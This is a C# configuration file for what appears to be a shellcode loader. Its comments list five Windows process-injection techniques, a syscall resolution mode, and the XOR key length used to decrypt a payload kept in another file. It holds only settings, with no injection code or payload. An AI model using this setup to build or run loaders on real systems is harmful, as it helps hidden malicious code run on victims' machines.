/*
 * Loader build configuration.
 * Edit these values to change loader behavior at compile time.
 */
static class Config
{
    // --- Technique selection ---
    //  0 = nt_thread      NtCreateThreadEx
    //  1 = nt_apc         NtQueueApcThread + NtTestAlert (self-inject)
    //  2 = nt_section     NtCreateSection + NtMapViewOfSection (dual-map)
    //  3 = nt_callback    EnumWindows callback
    //  4 = nt_suspended   NtCreateThreadEx (CREATE_SUSPENDED) + ResumeThread
    internal const int DefaultTechnique = 1;

    // --- Syscall mode ---
    //  "static"   = [DllImport] P/Invoke (default, no runtime resolution)
    //  "dynamic"  = GetProcAddress from ntdll at runtime
    internal const string SyscallMode = "static";

    // --- Payload decryption ---
    //  XOR key length in bytes (must match the key embedded in Shellcode.cs)
    internal const int XorKeyLen = 16;
}
